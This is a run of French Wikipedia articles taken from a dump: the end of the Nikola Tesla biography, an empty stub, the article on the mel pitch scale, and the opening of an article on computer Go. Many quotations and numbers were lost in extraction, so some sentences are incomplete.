Tesla procède dès lors à ses propres expériences sur les rayons X et met au point un tube à vide à haute énergie qui émet un rayonnement continu de freinage et est alimenté par bobine Tesla. Dans le cadre de ses recherches, Tesla conçoit plusieurs dispositifs expérimentaux pour produire des rayons X. Il soutient alors que, grâce à ses inventions, .
Tesla remarque lui-même les dangers de travailler avec les appareils produisant des rayons X. Dans ses nombreuses notes sur les premières investigations de ce phénomène, il attribue les dommages cutanés à diverses causes. Très tôt dans ses recherches, il croit que les dommages à la peau sont causés par l'ozone généré au contact de la peau. Tesla réalise finalement que les rayons sont dangereux après qu'un de ses assistants, qui est exposé pendant cinq minutes à trente centimètres du tube, présente de graves brûlures à son abdomen. Tesla abandonne ses recherches sur les rayons X au cours de 1896, probablement lorsqu'il se rend compte qu'il ne sera pas capable d'être compétitif sur le marché face à General Electrics ou même face aux petits fabricants d'instruments scientifiques. Il est également possible que la seule raison pour laquelle Tesla a conduit ses recherches sur les rayons X était de faire avancer son travail sur la transmission d'énergie sans fil. Ainsi, lorsque Tesla se serait rendu compte que les rayons X ne l'aideraient pas dans cette tâche, il serait passé à autre chose.
Radiocommande.
Alors qu'il est enfant, des cauchemars récurrents amènent Tesla à la réalisation que l'être humain n'est qu'une . Il se passionne dès lors pour l'automation et, en 1897, après avoir abandonné son travail sur les rayons X, son nouveau projet consiste à développer des automates radio-contrôlés .
La course à l'armement naval entre la Grande-Bretagne et ses rivaux pousse Tesla à s'essayer à un prototype de torpille télécommandée en forme de bateau. La commande du bateau se fait au moyen d'un transmetteur, qui émet un signal à une certaine fréquence, celui-ci étant reçu par un cohéreur sur la machine. La rotation du levier de commande active quant à elle un des quatre contacts, qui à leur tour désactivent le signal pour un moment donné. Lorsque le signal est coupé, dans le bateau, un disque avec des contacts tourne, activant une manœuvre prédéfinie selon la position du disque. Plus tard, pour s'assurer que des fréquences parasites n'activent pas le bateau, Tesla rajoute un second signal avec une fréquence différente en parallèle à la première.
Tesla fait breveter son invention et donne des démonstrations privées dans son laboratoire ; John Pierpont Morgan, William Kissam Vanderbilt, John Hays Hammond, et auraient assisté à ces présentations. Le bateau radiocommandé de Tesla arrive sur le marché quelques mois après le début de la guerre hispano-américaine, et Tesla en profite pour annoncer que son invention va mettre fin à la guerre. Plusieurs pays demandent alors les droits à l'invention de Tesla ; en un an, treize pays possèdent le bateau de Tesla. L'appareil fait sensation, certains considérant qu'il est mû par l'esprit de Tesla ou piloté par un singe savant caché à l'intérieur du bateau, et est bien reçu par le magazine "Electrical Review", mais il est très critiqué par d'autres. Il est vu par Cyrus Fogg Brackett, professeur à l'université de Princeton, comme peu pratique à déployer en temps de guerre, et "Electrical Engineer", un journal spécialisé tenu par Thomas Commerford Martin, un ami de Tesla, trouve l'invention et l'accuse d'avoir copié la torpille de William Clarke.
Énergie électrique sans fil.
De 1890 à 1906, Tesla consacre une grande partie de son temps et de sa fortune à une série de projets visant à développer la transmission d'énergie électrique sans fil. Il s'agit d'une extension de son idée d'utiliser des bobines pour transmettre l'énergie, qu'il a déjà démontrée avec l'éclairage sans fil. À l'époque où Tesla formule ses idées, il n'existe aucun moyen de transmettre sans fil des signaux de communication sur de longues distances, et encore moins de grandes quantités d'énergie. Tesla étudie les ondes radio et arrive à la conclusion qu'une partie de l'étude existante de Hertz à leur sujet est incorrecte. De plus, Tesla note que, même si les théories sur les ondes radio sont véridiques, elles ne l'aident pas dans ses objectifs, puisque cette forme de « lumière invisible » diminue lorsque la distance augmente, comme tout autre rayonnement, et voyage en ligne droite dans l'espace, devenant « irrémédiablement perdue ».
Colorado Springs.
Afin d'étudier plus avant la nature conductrice de l'air à basse pression, Tesla installe une station expérimentale à haute altitude à Colorado Springs en 1899. Il peut y faire fonctionner en toute sécurité des bobines beaucoup plus grandes que celles confinées dans son laboratoire de New York, et un associé passe un accord avec la compagnie d'électricité du comté d'El Paso pour lui fournir gratuitement du courant alternatif. Pour financer ses expériences, il persuade John Jacob Astor IV d'investir ( en ) pour devenir actionnaire majoritaire de la Nikola Tesla Company. Astor pense qu'il investit surtout dans le nouveau système d'éclairage sans fil. Au lieu de cela, Tesla utilise cet argent pour financer ses expériences à Colorado Springs. Après son arrivée, il déclare aux médias qu'il prévoit de mener des expériences de télégraphie sans fil, en transmettant des signaux du pic Pikes à Paris.
Là, il mène des expériences avec une grande bobine fonctionnant dans la gamme des mégavolts, qui produit des éclairs artificiels (et du tonnerre) de millions de volts et des décharges jusqu'à de long ; lors d'une expérience, il brûle par inadvertance le générateur d'El Paso, provoquant une panne de courant. Ses observations du bruit électronique de la foudre l'ont amené à conclure, à tort, qu'il pouvait utiliser la totalité du globe terrestre pour conduire de l'électricité.
Pendant son séjour, en 1899, Tesla observe des signaux inhabituels provenant de son récepteur, qu'il suppose être des communications provenant d'une autre planète. Il profite du début du nouveau siècle en pour faire part de sa découverte. Bien que Tesla soit très prudent dans sa déclaration, les signaux sont très vite interprétés par les journalistes comme venant de Mars, et l'histoire fait le tour de la presse à sensation. Une hypothèse de Marc Seifer, un biographe de Nikola Tesla, avance qu'il aurait détecté une expérience de Guglielmo Marconi, mais celui-ci se trouve alors en Italie, et la puissance de son système n'était probablement pas assez puissante pour envoyer des signaux jusqu'à Colorado Springs. En 1996, les frères Corum ont recréé les conditions de test de Tesla et sont parvenus à l'hypothèse qu'il aurait alors capté un signal venant de Io, une des lunes de Jupiter, qui émet un signal de lorsqu'elle passe à travers un tore de particules de plasma chargées.
Tesla passe également un accord avec l'éditeur du "Century Magazine" pour produire un article sur ses découvertes. Le magazine envoie un photographe au Colorado pour photographier le travail de Tesla. L'article, intitulé "", paraît dans le numéro de du magazine. Il y explique la supériorité du système sans fil qu'il a imaginé, mais l'article est davantage un traité philosophique qu'une description scientifique compréhensible de son travail, illustré par ce qui devient plus tard des images emblématiques de Tesla et de ses expériences à Colorado Springs.
Wardenclyffe.
En mars 1901, après être retourné à New York pour tenter de trouver des investisseurs pour ce qu'il pense être un système de transmission sans fil viable, il obtient ( en ) de John Pierpont Morgan en échange de 51 % des brevets sans fil générés et commence à planifier l'installation de la tour Wardenclyffe à Shoreham, dans l'État de New York, à à l'est de la ville, sur la côte nord de Long Island.
En , Tesla a élargi ses plans pour construire un émetteur plus puissant afin de devancer le système radio de Marconi, que Tesla pense être une copie du sien. Il approche Morgan pour lui demander plus d'argent pour construire un plus grand système, mais Morgan refuse. En , Marconi réussit à transmettre la lettre S depuis l'Angleterre jusqu'à Terre-Neuve, battant Tesla dans la course pour être le premier à réaliser une transmission transatlantique. Un mois après le succès de Marconi, Tesla tente de convaincre Morgan de soutenir un projet encore plus vaste visant à transmettre des messages et de l'énergie en contrôlant . Au cours des cinq années suivantes, Tesla écrit plus de à Morgan, demandant et exigeant des fonds supplémentaires pour achever la construction de Wardenclyffe. Tesla poursuit le projet pendant neuf mois supplémentaires en 1902. La tour est érigée à une hauteur de . En , Tesla déplace les activités de son laboratoire de Houston Street à Wardenclyffe.
De par son succès, Marconi a commencé à attirer de plus en plus d'investisseurs, tandis qu'une partie de la presse commence à parler du projet de Tesla comme d'une imposture. Tesla manque cruellement d'argent, ce qui ne lui permet pas, en 1903, de recouvrir le sommet de la tour de cuivre, empêchant celle-ci de fonctionner comme prévu. Morgan, suivi par d'autres investisseurs, se retire. Le projet est donc un échec, et Tesla finit par hypothéquer la propriété de Wardenclyffe pour couvrir ses dettes au Waldorf-Astoria.
Nouvelles inventions et recherche.
Après la fermeture de Wardenclyffe, Tesla continue d'écrire à Morgan ; après la mort du , Tesla écrit au fils de Morgan, Jack, pour essayer d'obtenir des fonds supplémentaires pour le projet. En 1906, Tesla ouvre des bureaux au à Manhattan, essayant de lever des fonds supplémentaires en développant et en commercialisant ses brevets. Il tient ensuite des bureaux à la Metropolitan Life Tower de 1910 à 1914. Il loue pendant quelques mois le Woolworth Building, mais déménage car il ne peut pas payer le loyer au de 1915 à 1925. Après avoir déménagé au 8 West 40th Street, il fait faillite : la plupart de ses brevets ont expiré et il rencontre des difficultés avec les nouvelles inventions qu'il essaye de développer.
Turbine sans aube.
Le jour de son anniversaire, en 1906, Tesla fait la démonstration d'une turbine sans aube de () à . En 1910-1911, à la Waterside Power Station de New York, plusieurs de ses moteurs à turbine sans aube sont testés entre . Tesla travaille avec plusieurs entreprises, notamment de 1919 à 1922 à Milwaukee pour Allis-Chalmers. Un manque d'intérêt de la part de l'industrie empêche les problèmes techniques d'être surmontés et l'invention de Tesla n'est finalement jamais transformée en un dispositif pratique. Tesla accorde une licence pour l'idée à une société d'instruments de précision et elle est finalement utilisée sous la forme de compteurs de vitesse de voitures de luxe et d'autres instruments.
Poursuites judiciaires concernant les communications sans fil.
Lorsque la Première Guerre mondiale éclate, les Britanniques coupent le câble télégraphique transatlantique reliant les États-Unis à l'Allemagne afin de contrôler le flux d'informations entre les deux pays. Ils tentent également de couper les communications sans fil allemandes à destination et en provenance des États-Unis en faisant en sorte que la société américaine Marconi poursuive la société de radio allemande Telefunken pour violation de brevet. Telefunken fait appel aux physiciens Jonathan Zenneck et Karl Ferdinand Braun pour sa défense et engage Tesla comme témoin pendant deux ans pour par mois. L'affaire piétine puis devient sans objet lorsque les États-Unis entrent en guerre contre l'Allemagne en 1917.
En 1915, Tesla tente de poursuivre la société Marconi pour violation de ses brevets d'accord sans fil. Le premier brevet radio de Marconi est accordé aux États-Unis en 1897, mais sa demande de brevet de 1900 couvrant les améliorations de la transmission radio est rejetée plusieurs fois, avant d'être finalement approuvée en 1904, au motif qu'elle viole d'autres brevets existants, y compris deux brevets de Tesla de 1897 sur le réglage de l'énergie sans fil. L'affaire Tesla de 1915 n'aboutit pas, mais dans une affaire connexe, où la Marconi Company tente de poursuivre le gouvernement américain pour violation de brevets de la Première Guerre mondiale, une décision de la Cour suprême des États-Unis de 1943 rétablit les brevets antérieurs d'Oliver Lodge, de John Stone Stone et de Tesla. La cour déclare que sa décision n'a aucune incidence sur la revendication de Marconi en tant que premier à réaliser une transmission radio, simplement que puisque la revendication de Marconi à certaines améliorations brevetées est douteuse, la société ne peut pas revendiquer la violation de ces mêmes brevets.
Dernières années.
Le rival de Nikola Tesla remporte le prix Nobel de physique en 1909 et la tour de Wardenclyffe est détruite en 1917. Nikola Tesla vit désormais reclus dans une chambre de l'hôtel New Yorker, refusant toute charité, mais recevant de la Westinghouse Electric &amp; Manufacturing Company un salaire mensuel de pour continuer ses différentes recherches.
En 1928, Tesla dépose son dernier brevet, un biplan à décollage et atterrissage verticaux.
À l'automne 1937, voulant éviter un taxi, Tesla est victime d'une mauvaise chute alors qu'il fait son trajet régulier vers la cathédrale et Central Park où il a l'habitude de nourrir les pigeons et de les recueillir dans son hôtel. Refusant de consulter un médecin ou d'être amené à l'hôpital, il est raccompagné dans sa chambre d'hôtel où il ne se rétablira jamais complètement.
Perclus de TOC, insomniaque chronique, il meurt le dans sa chambre d'hôtel à New York, seul, sans un sou et couvert de dettes, laissant derrière lui plus de et la réputation de savant génial, visionnaire et à moitié fou. Il reçoit le des funérailles nationales dans la cathédrale Saint-Jean le Théologien de New York, regroupant . Son corps est ensuite transporté au Ferncliff Cemetery où il est par la suite incinéré.
Après le décès de Nikola Tesla, sa famille engage avec l’administration américaine une longue procédure judiciaire pour acquérir ses documents de travail et ses effets personnels. En 1952, son neveu Sava Kosanović obtient que sa succession entière (manuscrits originaux, milliers de lettres, de photographies et la plupart de ses inventions) soit expédiée à Belgrade. Après un long procès, ce même neveu réussit, en 1957, à récupérer l’urne funéraire de son oncle. L’urne et les documents sont aujourd’hui au musée Nikola-Tesla à Belgrade en Serbie.
Inventions.
Brevets.
Tesla est l'auteur d’environ dont beaucoup sont attribués à tort à Thomas Edison traitant de nouvelles méthodes pour aborder la conversion de l’énergie.
Les communications et la transmission d'énergie sans fil.
Les théories de Tesla sur la possibilité de la transmission sans fil remontent à des conférences et des démonstrations qu'il a réalisées en 1893 à Saint-Louis dans le Missouri, au Franklin Institute en Pennsylvanie, et à la . Il met au point notamment la bobine Tesla vers 1891, puis entre 1895 et 1898 un .
Le radar.
En août 1917, Tesla propose les fréquences et l’énergie nécessaires pour un système de repérage à distance des obstacles dans le périodique "The Electrical Experimenter". Il propose l’utilisation d’une onde entretenue pour repérer les objets, cette onde formant une onde stationnaire avec la réflexion par la cible lorsque la fréquence est ajustée convenablement (Radar à ondes entretenues). La fréquence utilisée permet alors de déterminer la distance de l’objet ou sa variation dans le temps permet de déduire la vitesse radiale de déplacement. Il propose comme alternative l’utilisation d’impulsions pour obtenir le même résultat. Tesla envisageait l’affichage des échos résultants sur un écran fluorescent, une idée reprise par le radar.
Vie privée.
Apparence.
Nikola Tesla mesure et pèse entre 1888 et 1926, son poids variant très peu pendant cette période. Son apparence est décrite par le rédacteur en chef du journal Arthur Brisbane comme . Alors qu'il vit à New York, il est élégant et stylé, méticuleux dans sa toilette, ses vêtements et dans ses activités quotidiennes, une apparence qu'il entretient afin de favoriser ses relations d'affaires. Il s'est autoproclamé . Il est également décrit comme ayant les yeux clairs, de et des pouces .
Mémoire eidétique.
Au cours de sa vie, Tesla lit de nombreux ouvrages, mémorisant des livres complets, et possède soi-disant une mémoire photographique. Il est polyglotte, parlant huit langues : serbo-croate, tchèque, anglais, français, allemand, hongrois, italien et latin. Tesla raconte dans son autobiographie qu'il a vécu des moments d'inspiration détaillés. Il lui arrive à plusieurs occasions de voir des éclairs de lumière aveuglants, souvent accompagnés de visions. Souvent, ces visions sont liées à un mot ou à une idée qu'il aurait pu rencontrer ; à d'autres moments, elles apportent la solution à un problème particulier qu'il rencontre. En entendant le nom d'un objet, il peut l'imaginer dans ses moindres détails. Tesla peut visualiser une invention dans son esprit avec une extrême précision, en incluant toutes les dimensions, avant de passer à l'étape de la construction, une technique parfois appelée . Il ne fait généralement pas de dessins à la main, mais travaille de mémoire. Dès son enfance, Tesla a de fréquents "flashbacks" sur des événements qui se sont produits auparavant dans sa vie.
Relations.
Tesla est asocial et a tendance à s'isoler dans son travail. Cependant, lorsqu'il s’engage finalement dans des activités sociales, de nombreuses personnes parlent de Tesla de manière très positive et admirative. Robert Underwood Johnson l'a décrit comme ayant atteint . Sa secrétaire, Dorothy Skerrit, a écrit : . L'ami de Tesla, Julian Hawthorne, a écrit : .
Tesla ne s'est jamais marié, expliquant sa chasteté comme très utile pour ses capacités scientifiques. Margaret Cheney, auteure de "Nikola Tesla : L'homme qui a éclairé le monde", explique également que ses multiples phobies font de Tesla . Tesla aurait cependant eu un nombre important de femmes intéressées à lui et, alors qu'il vit à New York, il aurait loué deux chambres d'hôtels en même temps à deux endroits différents de la ville pour .
Tesla est un bon ami de Francis Marion Crawford, Robert Underwood Johnson, Stanford White, Fritz Lowenstein, George Scherff et Kenneth Swezey. Au milieu de sa vie, Tesla devient un ami proche de Mark Twain ; ils passent beaucoup de temps ensemble dans son laboratoire et ailleurs. Twain a notamment décrit l'invention du moteur à induction de Tesla comme . Lors d'une fête organisée par l'actrice Sarah Bernhardt en 1896, Tesla rencontre le moine hindou indien Vivekananda et tous deux discutent de la façon dont les idées de l'inventeur sur l'énergie semblent correspondre à la cosmologie védantique. À la fin des années 1920, Tesla se lie d'amitié avec George Sylvester Viereck, poète, écrivain, mystique et plus tard, propagandiste nazi. Tesla assiste occasionnellement à des dîners organisés par Viereck et sa femme.
Tesla peut parfois être dur et exprimer ouvertement son dégoût pour les personnes en surpoids. Il est prompt à critiquer les vêtements ; à plusieurs reprises, Tesla ordonne à une employée de rentrer chez elle et de changer de robe. À la mort de Thomas Edison, en 1931, Tesla fournit la seule opinion négative d'une vaste couverture de la vie d'Edison pour "The New York Times" :
Habitudes.
Sommeil.
Tesla a affirmé ne jamais dormir plus de deux heures par nuit, mais il a admis de temps en temps . Durant sa deuxième année d'études à Graz, Tesla a développé une compétence passionnée pour le billard, les échecs et le jeu de cartes, passant parfois plus de 48 heures d'affilée à une table de jeu. À une occasion, dans son laboratoire, Tesla a travaillé pendant 84 heures sans repos. Kenneth Swezey, un journaliste avec qui Tesla s'était lié d'amitié, a confirmé que Tesla dormait rarement. Swezey se souvient d'une fois où Tesla l'a appelé à 3 heures du matin : .
Routine.
Tesla travaillait tous les jours de à ou plus tard, avec un dîner à exactement, au restaurant Delmonico's, ou plus tard dans sa vie à l'hôtel Waldorf-Astoria. Tesla commandait alors par téléphone son dîner au maître d'hôtel, qui était le seul à pouvoir le servir. . Tesla est devenu végétarien dans les dernières années de sa vie, ne vivant que de lait, de pain, de miel et de jus de légumes.
Opinions et croyances.
Physique expérimentale et théorique.
Tesla n'est pas d'accord avec la théorie selon laquelle les atomes sont composés de particules subatomiques plus petites, affirmant qu'il n'existe pas d'électrons créant une charge électrique. Il pense que si les électrons existent, ils sont un quatrième état de la matière ou qui ne peut exister que dans un vide expérimental et qu'ils n'ont rien à voir avec l'électricité. Tesla pense que les atomes sont immuables . Il croit au concept du d'un éther omniprésent qui transmet l'énergie électrique.
Tesla est généralement en désaccord avec les théories sur la conversion de la matière en énergie. Il est également critique de la théorie de la relativité d'Albert Einstein, disant :
Tesla prétend avoir développé son propre principe physique concernant la matière et l'énergie, sur lequel il commence à travailler en 1892 et, en 1937, à l'âge de , il affirme dans une lettre avoir achevé une qui . Il affirme que la théorie est et qu'il espère la donner bientôt au monde. Ses écrits n'ont jamais permis d'élucider davantage sa théorie.
Société.
Tesla est largement considéré par ses biographes comme étant un humaniste dans sa vision philosophique en plus de ses dons de scientifique technologique. Cela ne l'empêche pas, comme beaucoup de son époque, de devenir un partisan d'une version de l'eugénisme, basée sur une sélection artificielle imposée. Bien que son argumentation ne dépende pas du concept de ou de la supériorité inhérente d'une personne par rapport à une autre, il plaide en faveur de l'eugénisme dans une interview accordée en 1937 et déclare : 
Jeune, Tesla ne s'estime pas digne d'une femme, considérant les femmes comme supérieures sur tous les points. Son opinion commence à osciller plus tard, lorsqu'il se met à penser que les femmes essayent de surpasser les hommes et de se rendre plus dominantes. Cette est accueillie avec beaucoup d'indignation par Tesla, qui a le sentiment que les femmes perdent leur féminité en essayant d'être au pouvoir. Dans une interview accordée au "Galveston Daily News" le , il déclare : .
Au , l'interview du "Galveston Daily News" rend Tesla populaire auprès du mouvement MGTOW, une communauté masculiniste anti-mariage qui considère l'inventeur comme l'un des pionniers de leur mouvement. Selon Massimo Teodorani, auteur de la biographie "Tesla, L'éclair du génie", le rapprochement entre Tesla et ce mouvement relève de l'instrumentalisation politique. Toujours selon Teodorani, l'interview démontre plus la personnalité étrange de Tesla qu'une mentalité sexiste. Dans une autre interview datée de 1926, Tesla déclare d'ailleurs : .
Religion.
Tesla est élevé en tant que chrétien orthodoxe mais ne se considère pas comme un . Il déclare s'opposer au fanatisme religieux et que . Il a également déclaré : et .
Accessoirement, il s’intéresse aussi à la mythologie hindoue, ainsi qu'au sanskrit.
Postérité.
Familiale.
La plupart des membres de la famille de Nikola Tesla ont été tués par les Oustachis lors du génocide contre les Serbes dans l'État indépendant de Croatie ; William Terbo, petit-fils de Angelina Tesla et décédé en 2018 dans le New Jersey, a revendiqué être le dernier membre connu de la famille de Nikola Tesla. Des descendants de cousins germains de Nikola Tesla portent toujours le nom de famille « Tesla ».
Hommages scientifiques.
Son nom a été donné en 1956 à l’unité d’induction magnétique : le tesla (symbole : T), qui est l’unité dérivée du Système international d'unités (SI) de l'induction magnétique (appelé parfois densité de flux magnétique ou champ magnétique).
Plusieurs lieux, objets et entreprises ont été nommés en hommage à Tesla, comme la bobine Tesla, l'oscillateur de Tesla, la tour de Tesla, la turbine de Tesla, l'unité de l'induction électromagnétique, la société Tesla, Inc. (constructeur de voitures électriques) et l'aéroport Nikola-Tesla de Belgrade. Un cratère sur la Lune et l'astéroïde (2244) Tesla portent également le nom de l'inventeur. Depuis 2023, son portrait orne les pièces de 10, 20 et d'euro croates.
Le scientifique a également été célébré par des dates commémoratives nationales et régionales dans le monde entier, comme en Serbie, au Canada, à Niagara Falls dans l'État de New York et à Palo Alto, aux États-Unis, à Niagara Falls en Ontario et à Hamilton, au Canada, et à Bakou, en Azerbaïdjan.
Dans l'art et la culture.
L'histoire de Tesla a inspiré cependant dans de nombreux livres, films, séries télévisées, pièces de théâtre, bandes dessinées, jeux vidéo et également dans le monde de la musique. L'impact des technologies inventées ou imaginées par Tesla est un thème récurrent dans divers types de science-fiction.
Une peinture murale lui rend hommage dans la ville universitaire de Louvain-la-Neuve en Belgique, dans le parking situé sous la place des Sciences.

</doc>
<doc id="1872541" url="https://fr.wikipedia.org/wiki?curid=1872541" title="Cellule dysplasique">
Cellule dysplasique



</doc>
<doc id="1872542" url="https://fr.wikipedia.org/wiki?curid=1872542" title="Échelle des mels">
Échelle des mels

L'échelle des mels est une échelle psychoacoustique de hauteurs des sons, au sens de leur repérage entre grave et aigu, dont l'unité est le "mel".
Le mel est relié au hertz (Hz), l'unité de mesure du Système international pour les fréquences, par une relation basée sur des expériences basées sur l'audition humaine.
Principe.
L'échelle a été proposée en 1937 par Stanley Smith Stevens, John Volkman et Edwin Newman, sur la base d'une expérience de psychologie expérimentale où cinq sujets devaient indiquer un son pur à la moitié de la hauteur d'un son pur de référence pour dix fréquences différentes, avec une sonie constante de .
Les auteurs concluent en outre que l'échelle est cohérente avec l'écart de fréquence nécessaire pour distinguer deux sons, à chaque fréquence, ce qui, d'après eux, implique que la hauteur et la sensibilité différentielle à la hauteur sont toutes deux des fonctions linéaires sur l'étendue de la membrane basilaire de l'oreille interne. Selon ce point de vue, quand l'auditeur recherche une hauteur à la moitié d'une autre, il ajuste le son pour trouver un point de résonance dans une zone à la moitié de la distance jusqu'à l'extrémité apicale de la membrane basilaire. La mesure de l'étendue subjective d'intervalles musicaux comme les octaves montre que ces intervalles grandissent quand la fréquence de leur point central augmente (sauf dans les deux octaves audibles supérieures).
L'échelle a été conçue de telle façon que correspondent à et qu'un rapport constant de la valeur en mels soit perçu par les auditeurs comme une variation constante de hauteur musicale. 
En effet, l'audition humaine ne perçoit pas le doublement de la fréquence d'un son pur (correspondant à un intervalle d'octave pour un son musical) comme une variation égale de hauteur à toutes les fréquences. L'échelle des mels est établie pour qu'un doublement de la valeur en mels soit perçu comme une variation de hauteur identique quelle que soit la fréquence de départ.
Formules.
La conversion de hertz en mels se fait à l'aide d'une des formules suivantes :
Les formules réciproques (pour passer de mels en hertz) sont donc :
Critiques.
L'échelle de mel a fait l'objet de critiques nombreuses et vigoureuses, d'une part parce qu'elle contredit les notions de la théorie de la musique, qui semblent fondées sur une expérience autrement vaste, et d'autre part, en raison de questions de méthode.
Les méthodes promues par Stevens et autres pour obtenir des échelles numériques basées sur les perceptions ont provoqué des débats d'ordre général sur le rapport entre ces constructions, d'une part, et les mesures physiques, d'autre part. D'autres auteurs ont fait remarquer qu'il était possible de construire, à partir de la faible quantité de données expérimentales présentées par les auteurs, un bon nombre d'autres échelles.
Stevens lui-même a rencontré des résultats contradictoires dans des expériences ultérieures, où l'on demandait aux sujets d'ajuster un son pur pour qu'il soit à égale distance entre deux autres. Il s'avère que les sujets ne trouvent pas les mêmes valeurs selon qu'on leur présente les sons dans l'ordre grave, puis aigu, ou l'ordre inverse.
Ces discussions ont abouti à l'établissement d'une quantité d'échelles différentes. Cependant, elles ne remettent pas en cause la constatation fondamentale de la recherche de Stevens, Volkmann et Newman, connue sous le nom de « dilatation des octaves » dans le registre aigu, qui est corroborée partiellement par certains aspects de la pratique musicale, notamment l'accord du piano. Quant à l'échelle proposée, comme , les polémiques ne pouvaient avoir de grandes conséquences.
La contradiction avec la tradition musicale s'atténue avec un modèle de l'audition humaine apparu plus tard, pour lequel la perception de la hauteur est la synthèse de deux systèmes perceptuels qui pourraient être physiologiquement distincts, la "hauteur spectrale", basée sur la situation de l'origine de l'influx nerveux dans la membrane basilaire, situant la hauteur à un ou deux tiers d'octave près (selon les auteurs) sur une échelle allant du plus grave au plus aigu, et la "hauteur fondamentale" ou "chroma", basée sur la corrélation entre des influx nerveux transmis par des voies différentes, déterminant précisément la place d'un son harmonique dans une octave, définie alors comme un doublement de fréquence, sans indiquer de quelle octave il s'agit.
D'autres auteurs font remarquer que les sons musicaux sont des sons complexes, comportant généralement toute une série de partiels harmoniques, ce qui donne à l'auditeur des indices suffisants pour situer ce qu'il écoute par rapport à un système musical, quelle que soit la perception qu'il pourrait avoir dans le contexte du laboratoire.

</doc>
<doc id="1872543" url="https://fr.wikipedia.org/wiki?curid=1872543" title="Go en informatique">
Go en informatique

Le développement de programme informatique capable de jouer au go est un problème de l'intelligence artificielle. Ce problème est considéré comme l'un des plus complexes à résoudre, les algorithmes classiques (minimax et alpha-bêta) offrant des résultats médiocres. 
Le premier programme a été écrit en 1968 par comme un élément de sa thèse sur la reconnaissance des formes. Ce n'est qu'en 2015 qu'un programme AlphaGo bat pour la première fois un joueur de go professionnel, Fan Hui, champion d'Europe de go, avant de battre Lee Sedol, l'un des meilleurs joueurs au monde, en et Ke Jie, le meilleur joueur du monde, en .
Description du problème.
Comme pour tous les jeux, il faut jouer un coup qui améliore sa situation et détériore celle de son adversaire. Pour estimer une situation aux échecs, une bonne estimation est de compter le nombre de pièces sur l'échiquier, en les pondérant (1 point par pion, 5 par tour...), et en ajustant la valeur trouvée par les libertés, les protections des pièces... 
Cela passe par le calcul d'une fonction d'évaluation, associant les scores de chacun des adversaires à chaque nœud.
C'est difficilement réalisable au go : on ne dispose pas de fonction d'évaluation (estimation des valeurs antagonistes d'une position) ne nécessitant pas - entre autres - des capacités « humaines » de « reconnaissance de formes », l'« expérience de parties » déjà jouées et une très grande « profondeur de calcul ».
La technique d'exploration des différentes possibilités (pour chaque coup, déterminer la meilleure réponse possible, puis la meilleure réponse à celle-ci, et ainsi de suite…), plus techniquement la méthode dite minimax, échoue au go à cause de l'énorme quantité de coups plausibles, de la durée des parties et de leur complexité croissante (aux échecs, la complexité est - elle - décroissante par diminution du nombre de pièces restantes). 
Le nombre de positions légales est estimé à 10 - sur un goban 19×19 (contre environ 10 aux échecs - sur un échiquier 8×8), tandis que l'arbre du jeu couvre 10 parties plausibles (contre environ 10 aux échecs).
Histoire.
Débuts.
L'augmentation de la puissance des ordinateurs n'a que très peu d'influence sur le niveau des programmes de go, et le problème du go est souvent considéré comme l'un des grands défis de l'intelligence artificielle.
Le premier tournoi entre machines a été organisé en 1984 par l'entreprise "Acorn Computers" et est remporté par le programmeur polonais Bronislaw Przybyla. Les huit programmes respectent les règles (à l'exception dans un cas d'une difficulté durant une bataille de ko) mais jouent .
Contrairement aux programmes de jeu d'échecs qui ont rivalisé avec les meilleurs professionnels dès les années 1990, les programmes de go n'ont commencé à se rapprocher du niveau des joueurs de go professionnels qu'en 2013. Auparavant, sur les petits plateaux de taille 9×9, les meilleurs programmes avaient atteint en 2005 le niveau des joueurs amateurs en dan, mais les techniques qui ont permis cette progression ne donnaient que des résultats mitigés sur la taille normale de plateau 19×19, et le niveau en dan est resté hors d'atteinte jusqu'à l'apparition des programmes s'appuyant sur l'algorithme de Monte-Carlo en 2006.
Avant cette date, un joueur moyen était capable de battre les meilleurs programmes et certains bons joueurs, entraînés spécifiquement, les avaient battu avec des handicaps allant jusqu'à 30 pierres, ce qui serait impossible contre un joueur humain, même très peu expérimenté. 
Ainsi en 1997, Janice Kim, "shodan" professionnelle ( pro.), battait le programme "HandTalk" malgré un handicap de 25 pierres puis en 1998, Martin Müller, amateur, battait "Many Faces of Go" malgré un handicap de 29 pierres.
Sur des "goban" de petite taille, les calculs sont plus simples à effectuer. En 2002, le jeu sur un "goban" 5×5 a été résolu par le programme MIGOS (MIni GO Solver) de Erik van der Werf, fruit de l'examen de positions (environ 4 heures sur un P4 ). Sa thèse développe plus largement la résolution du go 5×5.
Avancées techniques.
Une des alternatives majeures à l'utilisation de connaissances et de recherches est l'utilisation des méthodes de Monte-Carlo. Pour cela il suffit de lister les coups possibles et pour chaque coup de jouer des milliers de parties au hasard. Le coup qui conduit au meilleur résultat pour le joueur courant est supposé le meilleur coup. L'avantage de cette méthode est qu'elle requiert peu de connaissances spécifiques mais l'inconvénient est qu'elle est coûteuse en termes de mémoire et de temps processeur. De plus, parce que les coups utilisés pour l'évaluation sont choisis au hasard, il est possible qu'un coup qui serait excellent sauf pour une réponse spécifique soit de façon erronée choisi comme un bon coup. Le résultat est un programme qui est fort d'un point de vue stratégique mais faible tactiquement. Ce problème peut être compensé en ajoutant de la connaissance à la génération de coup et une plus grande profondeur de recherche avant l'évaluation de Monte-Carlo. Parmi les programmes qui utilisent les techniques de Monte-Carlo se trouvent MoGo, Crazy Stone, Olga and Gobble.
En 2006, une nouvelle technique, "upper confidence bounds applied to trees" (UCT), a été développée et utilisée par de nombreux programmes sur 9×9 avec d'excellents résultats. UCT utilise les résultats des "play outs" joués jusque-là pour guider l'exploration tout en autorisant des séquences alternatives à être explorées. UCT et de nombreuses autres optimisations ont conduit MoGo à être l'un des plus forts programmes produits par un chercheur. Parmi les premières applications avec succès de la méthode UCT sur 19×19 on peut trouver MoGo, CrazyStone, et Mango. MoGo a gagné l'édition 2007 des Computer Olympiad et gagné un blitz sur trois contre Guo Juan, professionnel, sur le goban 9×9. The Many Faces of Go a gagné l'édition 2008 des Computer Olympiad après avoir ajouté UCT à ses méthodes classiques de recherche.
